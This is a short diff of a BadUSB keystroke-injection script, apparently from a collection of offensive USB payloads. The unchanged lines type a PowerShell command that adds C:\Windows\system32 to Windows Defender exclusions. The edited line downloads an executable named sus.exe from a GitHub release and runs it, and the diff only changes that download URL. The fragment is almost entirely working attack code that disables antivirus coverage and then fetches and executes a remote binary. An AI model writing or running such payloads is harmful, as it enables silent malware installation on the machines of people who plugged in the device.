@@ -12,5 +12,5 @@ DELAY 1500
 STRING Add-MpPreference -ExclusionPath C:\Windows\system32
 ENTER
 DELAY 500
-STRING $down=New-Object System.Net.WebClient;$url='https://github.com/AGO061/badusb-payloads/raw/main/SUS/sus.exe';$file='sus.exe'; $down.DownloadFile($url,$file);$exec=New-Object -com shell.application;$exec.shellexecute($file);exit
+STRING $down=New-Object System.Net.WebClient;$url='https://github.com/AGO061/badusb-payloads/releases/download/SUS-R1/sus.exe';$file='sus.exe'; $down.DownloadFile($url,$file);$exec=New-Object -com shell.application;$exec.shellexecute($file);exit
 ENTER
